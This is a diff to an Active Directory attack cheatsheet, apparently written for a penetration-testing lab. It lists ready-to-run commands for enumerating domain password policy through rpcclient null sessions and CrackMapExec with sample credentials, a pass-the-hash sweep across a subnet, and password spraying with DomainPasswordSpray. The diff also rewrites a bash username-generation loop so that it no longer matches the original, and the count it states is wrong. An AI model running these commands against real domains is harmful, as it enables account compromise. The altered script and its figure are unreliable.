@@ -44,7 +44,7 @@ tags: [activeDirectory, cheatsheet]
 
 | Command                                                      | Description                                                  |
 | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| ```#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done``` | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host. |
+| **Bash Username Generation Script** | Bash script used to generate 16,079,616 possible username combinations from a Linux-based host. See code example below the table. |
 | `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
 | `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
 | `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |
@@ -66,6 +66,15 @@ tags: [activeDirectory, cheatsheet]
 | `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
 | `Import-Module .\DomainPasswordSpray.ps1`                    | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |
 | `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host. |
+
+### Bash Username Generation Script Example
+
+```bash
+#!/bin/bash  
+for x in {A..Z}{0..9}{A..Z}{0..9}{A..Z}{0..9}{A..Z}{0..9}; do 
+    echo $x
+done
+```
 
 ## Enumerating Security Controls
 
